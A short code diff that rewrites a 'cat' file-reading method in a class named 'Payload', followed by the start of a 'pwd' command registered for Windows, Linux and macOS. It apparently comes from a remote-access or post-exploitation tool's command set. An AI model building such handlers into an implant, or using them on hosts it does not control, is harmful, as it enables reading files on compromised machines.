@@ -337,16 +337,16 @@ class Payload():
         :param str path:  target filename
 
         """
-        output = []
+        output = ''
         if not os.path.isfile(path):
-            return "Error: file not found"
-        for line in open(path, 'rb').read().splitlines():
-            if len(line) and not line.isspace():
-                if len('\n'.join(output + [line])) < 48000:
-                    output.append(line)
-                else:
-                    break
-        return '\n'.join(output)
+            return "cat: file not found."
+        try:
+            file = open('%s' % (path), mode='r')
+            output = file.read()
+            file.close()
+        except:
+            return "cat: can't decode this file."
+        return output
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='pwd')
